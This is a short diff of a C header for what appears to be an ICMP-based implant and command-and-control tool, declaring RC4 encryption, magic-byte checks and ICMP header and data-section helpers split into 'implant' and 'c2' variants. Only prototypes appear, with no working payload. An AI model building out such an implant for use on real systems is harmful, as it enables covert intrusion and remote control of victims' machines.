@@ -21,8 +21,10 @@ void rc4(unsigned char* data, long data_len, unsigned char* key, long key_len, u
 int check_magic_byte(struct icmphdr *icmp);
 unsigned short cksum(unsigned short *addr, int len);
 struct sockaddr_in prep_ip_headers(struct iphdr *ip);
-void prep_icmp_headers(struct icmphdr *icmp, size_t size);
 unsigned char *parse_data_section(unsigned char *packet);
-void append_to_data_section(struct icmphdr *icmp, unsigned char *input);
+void implant_append_to_data_section(struct icmphdr *icmp, unsigned char *input);
+void implant_prep_icmp_headers(struct icmphdr *icmp, size_t size);
+void c2_append_to_data_section(struct icmphdr *icmp, unsigned char *input);
+void c2_prep_icmp_headers(struct icmphdr *icmp, size_t size);
 
 #endif
